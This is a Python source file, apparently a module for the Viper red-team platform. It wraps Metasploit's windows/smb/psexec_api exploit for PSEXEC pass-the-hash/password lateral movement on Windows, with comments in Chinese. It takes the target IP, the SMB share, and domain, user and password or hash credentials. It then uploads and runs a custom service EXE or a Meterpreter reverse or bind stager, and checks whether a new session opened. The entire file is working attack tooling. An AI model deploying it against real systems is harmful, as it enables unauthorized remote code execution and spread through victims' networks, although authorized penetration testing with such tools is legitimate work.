# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "PSEXEC明文/哈希传递"
    DESC = "模块使用已知的用户名及密码(哈希),通过psexec方式在目标主机执行载荷.\n" \
           "如果没有填写IP地址参数则模块默认测试当前主机.\n" \
           "如使用自定义的EXE,请确认exe为service类型的exe"
    MODULETYPE = TAG2CH.Lateral_Movement
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1097"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1097/"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = False
    OPTIONS = register_options([
        OptionStr(name='RHOST', name_tag="目标IP", desc="目标的IP地址"),
        OptionEnum(name='TARGET', name_tag="执行方式", desc="选择载荷的加载方式",
                   required=True,
                   default=2,
                   enum_list=[
                       {'name': '自动选择', 'value': 0},
                       {'name': 'Powershell', 'value': 1},
                       {'name': '二进制上传', 'value': 2},
                       {'name': 'MOF技术', 'value': 3},
                       {'name': 'COMMAND', 'value': 4},
                   ],
                   ),

        OptionStr(name='SHARE', name_tag="共享目录", required=True, default="ADMIN$",
                  desc="目标主机的共享目录,可以是ADMIN$或C$等管理员目录或其他可读写的共享目录"),
        OptionStr(name='SMBDomain', name_tag="域", desc="目标主机的域信息 . 表示本地域"),
        OptionStr(name='SMBUser', name_tag="用户名", desc="smb用户名"),
        OptionStr(name='SMBPass', name_tag="密码", desc="smb密码"),
        OptionCredentialEnum(required=False, password_type=['windows', ]),
        OptionHander(required=False),
        OptionFileEnum(required=False, ext=['exe', 'dll']),
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "exploit"
        self.mname = "windows/smb/psexec_api"

    def check(self):
        """执行前的检查函数"""
        rhost = self.param('RHOST')
        if rhost is None:
            self.set_option(key='RHOSTS', value=self.host_ipaddress)
        else:
            self.set_option(key='RHOSTS', value=rhost)

        if self.param('SHARE') is not None:
            self.set_option(key='SHARE', value=self.param('SHARE'))

        if self.param('TARGET') is not None:
            self.set_option(key='TARGET', value=self.param('TARGET'))

        flag = self.set_smb_info_by_credential()
        if flag is not True:
            domain = self.param('SMBDomain')
            user = self.param('SMBUser')
            password = self.param('SMBPass')
            if domain is not None and user is not None and password is not None:
                self.set_option(key='SMBDomain', value=domain)
                self.set_option(key='SMBUser', value=user)
                self.set_option(key='SMBPass', value=password)
            else:
                return False, "请选择凭证或手工输入凭证"
        else:
            # 手工输入覆盖凭证输入
            domain = self.param('SMBDomain')
            user = self.param('SMBUser')
            password = self.param('SMBPass')
            if domain is not None and domain != "":
                self.set_option(key='SMBDomain', value=domain)
            if user is not None and user != "":
                self.set_option(key='SMBUser', value=user)
            if password is not None and password != "":
                self.set_option(key='SMBPass', value=password)

        # 自定义exe
        pe_file_path = self.get_option_filepath(msf=True)  # msf=True是为了调试

        if pe_file_path is not None:
            pe_file_path = self.get_option_filepath(msf=True)
            self.set_option(key='TARGET', value=2)
            self.set_option(key='PAYLOAD', value="generic/custom")
            self.set_option(key='PAYLOADFILE', value=pe_file_path)
            self.set_option(key='EXE::Custom', value=pe_file_path)
            self.set_option(key='disablepayloadhandler', value=True)
            return True, None
        else:
            payload = self.get_handler_payload()
            if payload is None:
                return False, "Handler解析失败,请重新选择Handler参数"
            if "meterpreter_reverse" in payload or "meterpreter_bind" in payload:
                return False, "请选择Stager类型的监听(例如/meterpreter/reverse_tcp或/meterpreter/bind_tcp)"
            flag = self.set_payload_by_handler()
            if flag is not True:
                return False, "Handler解析失败,请重新选择Handler参数"
            return True, None

    def callback(self, status, message, data):

        if status:
            result_format = "模块执行完成,请查看是否已生成新的Session"
            self.log_good(result_format)
        else:
            result_format = "模块执行失败,无法使用提供的参数连接远程SMB服务.请检查是否添加内网路由或主机是否可以连接"
            self.log_error(result_format)
            self.log_error(message)
